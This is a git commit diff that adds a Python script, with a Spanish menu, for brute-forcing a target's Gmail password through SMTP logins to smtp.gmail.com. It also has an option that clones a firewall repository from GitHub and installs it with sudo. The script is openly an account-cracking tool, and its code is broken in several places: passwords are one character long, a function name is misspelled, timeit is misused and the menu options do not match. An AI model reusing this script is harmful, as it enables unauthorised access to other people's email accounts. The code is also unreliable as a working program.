5f1a2661426fc2eab8be0610bbbf9a999b907006
mouse3 <70779934+mouse3@users.noreply.github.com>
2021-12-10 18:54:08 +0100

    index.py

---
+++ test.py
@@ -0,0 +1,66 @@
+import random
+import string 
+import smtplib	
+import os
+import time
+import socket
+from timeit import default_timer as timer
+import timeit
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+# <---<bruteforce>--->
+def bruteforceall():
+	gmail = input("Enter the target's email address: ")
+	while 1:
+		time.sleep(0.5)
+		characters = list(string.ascii_letters + string.digits + "!$%&'()*+,-./0123456789:;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\^_`abcdefghijklmnopqrstuvwxyz{|}~][")
+		length = 1
+		passwordd = []
+		for i in range(length):
+				passwordd.append(random.choice(characters))
+		random.shuffle(passwordd)
+		for password in passwordd:
+			try:
+
+				t = time.process_time()
+				time.sleep(5)
+				timeit(smtpserver.login(gmail, password))
+				elapsed_time = time.process_time() - t
+
+
+			except smtplib.SMTPAuthenticationError:
+				print("[!] Password Incorrect: %s" % password)
+				print(t + "ms")
+			if t < 0.453125:
+				print("lol")
+def firewall():
+	print("1 --> install")
+	print("2 --> execute")
+	print("3 --> exit   ")
+	firewall = input(">>>")
+	if firewall == "1":
+		os.system("sudo cd /usr/local/src/")
+		os.system("sudo git clone https://github.com/netkiller/firewall.git")
+		os.system("sudo cd firewall")
+		os.system("sudo bash install.sh")
+		os.system("sudo python3 setup.py install")
+	if firewall == "2":
+		os.system("firewall")
+	if firewall == "3":
+		os.system("clear")
+def menu():
+	print("modos:")
+	print("    all (pruba con todos los caracteres(se tarda mucho mas))")
+	print("    mayus (prueba solo con caracteres en mayusculas)")
+	print("    minus(prueba solo en minusculas)")
+	print("    security(calcula la velocidad media de ataque ")
+	option = input("opcion>>>")
+	if option == "bruteforce":
+		print("porfavor indique la opcion de [bruteforce]")
+	if option == "firewall":
+		firewall()
+	if option == "bruteforce -all":
+		bruterforceall()
+
+menu()
